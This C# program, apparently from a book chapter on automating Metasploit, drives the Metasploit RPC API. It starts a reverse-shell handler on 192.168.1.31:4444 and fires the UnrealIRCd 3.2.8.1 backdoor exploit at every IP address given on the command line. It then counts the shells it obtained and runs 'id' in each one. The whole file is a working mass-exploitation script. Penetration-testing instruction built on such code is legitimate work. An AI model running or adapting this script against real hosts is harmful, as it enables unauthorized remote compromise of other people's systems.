using System;
using System.Collections.Generic;

namespace ch13_automating_metasploit
{
	class MainClass
	{
		public static void Main (string[] args)
		{
			using (MetasploitSession session = new MetasploitSession ("user", "pass", "http://127.0.0.1:55553/api")) {
				if (string.IsNullOrEmpty (session.Token))
					throw new Exception ("Login failed. Check credentials");

				using (MetasploitManager manager = new MetasploitManager (session)) {
					Dictionary<string, object> response = null;

					Dictionary<string, object> blah = new Dictionary<string, object> ();
					blah ["ExitOnSession"] = "false";
					blah ["PAYLOAD"] = "cmd/unix/reverse";
					blah ["LHOST"] = "192.168.1.31";
					blah ["LPORT"] = "4444";

					response = manager.ExecuteModule ("exploit", "multi/handler", blah);
					object jobID = response ["job_id"];

					foreach (string ip in args) {
						Dictionary<string, object> opts = new Dictionary<string, object> ();
						opts ["RHOST"] = ip;
						opts ["DisablePayloadHandler"] = "true";
						opts ["LHOST"] = "192.168.1.31";
						opts ["LPORT"] = "4444";
						opts ["PAYLOAD"] = "cmd/unix/reverse";

						response = manager.ExecuteModule ("exploit", "unix/irc/unreal_ircd_3281_backdoor", opts);
					}

					response = manager.ListJobs ();
					List<object> vals = new List<object> (response.Values);
					while (vals.Contains ((object)"Exploit: unix/irc/unreal_ircd_3281_backdoor")) {
						Console.WriteLine ("Waiting");
						System.Threading.Thread.Sleep (6000);
						response = manager.ListJobs ();
						vals = new List<object> (response.Values);
					}


					response = manager.StopJob (jobID.ToString ());
					response = manager.ListSessions ();

					Console.WriteLine ("I popped " + response.Count + " shells. Awesome.");

					foreach (var pair in response) {
						string id = pair.Key;
						Dictionary<string, object> dict = (Dictionary<string, object>)pair.Value;
						if ((dict ["type"] as string) == "shell") {
							response = manager.WriteToSessionShell (id, "id\n");
							System.Threading.Thread.Sleep (6000);
							response = manager.ReadSessionShell (id);

							Console.WriteLine (response ["data"]);

							manager.StopSession (id);
						}
					}
				}
			}
		}
	}
}
